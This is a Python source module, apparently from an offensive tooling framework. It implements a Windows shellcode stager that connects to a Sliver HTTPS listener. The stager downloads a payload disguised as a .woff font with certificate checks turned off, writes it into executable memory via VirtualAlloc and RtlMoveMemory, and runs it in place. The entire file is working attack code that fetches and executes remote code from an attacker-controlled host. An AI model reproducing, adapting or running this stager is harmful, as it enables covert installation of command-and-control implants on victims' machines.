#import utils.arg
from utils.helper import nstate as nstate
from time import sleep
import ctypes.wintypes
#import sys
#import argparse
#import socket
import requests
#import struct
import ctypes

CATEGORY = 'stager'

def register_arguments(parser):
        parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
        parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to e.g. 192.168.2.1')

class stage():
    
    Author = 'psycore8'
    Description = 'Connect to a Sliver HTTPS listener, download stage and execute'
    Version = '1.0.0'
    MEM_COMMIT_RESERVE = 0x00003000
    PAGE_READWRITE_EXECUTE = 0x00000040
    kernel32 = ctypes.windll.kernel32
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
    VirtualAlloc.restype = ctypes.wintypes.LPVOID
    RtlMoveMemory = kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    RtlMoveMemory.restype = None
    CreateThread = kernel32.CreateThread
    CreateThread.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.wintypes.DWORD, ctypes.c_int]
    CreateThread.restype = None
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
    WaitForSingleObject.restype = None

    def __init__(self, remote_host=str, remote_port=int):
        self.remote_host = remote_host
        self.remote_port = remote_port

    def process(self):
        #static_url = 'https://172.17.253.140:9911/ObjectFile.woff'
        static_url = f'https://{self.remote_host}:{self.remote_port}/Serif.woff'
        try:
            print(f'{nstate.OKBLUE} Trying to download stage...')
            response = requests.get(static_url, stream=True, verify=False)
            response.raise_for_status()
            stage_data = response.content
            print(f'{nstate.INFO} Stage URL: {static_url}')
            #print(f'{stage_data[0:16]}')
            print(f"{nstate.OKGREEN} Data downloaded, size: {len(stage_data)}")
        except requests.exceptions.RequestException as e:
            print(f"{nstate.FAIL} Error during stage download: {e}")
        print(f'{nstate.OKBLUE} Trying to find payload position...')
        stage_start = stage_data.find(b'\x00')
        stage_buffer = bytearray(stage_data[stage_start + 1:])
        print(f'{nstate.OKGREEN} Payload found, printing the first 8 bytes: {stage_buffer[0:8]}')
        print(f'{nstate.INFO} Stage length: {len(stage_buffer)}')
        ptr = self.VirtualAlloc(0, len(stage_buffer), self.MEM_COMMIT_RESERVE, self.PAGE_READWRITE_EXECUTE)
        if ptr:
             print(f'{nstate.OKGREEN} Memory allocated!')
        else:
             print(f'{nstate.FAIL} Memory not allocated!')
             exit()
        buf = (ctypes.c_char * len(stage_buffer)).from_buffer(stage_buffer)
        if buf:
            print(f'{nstate.OKGREEN} Buffer prepared!')
            self.RtlMoveMemory(ptr, buf, len(stage_buffer))
            ptr_f = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
            ptr_f()
            #ht = self.CreateThread(0, 0, ptr, 0, 0, ctypes.c_int(0))
            # if ht:
            #      print('Thread created')
            # else:
            #      print('Error')
            #self.WaitForSingleObject(ht, 1)
        else:
            print(f'{nstate.FAIL} Buffer not valid!')

    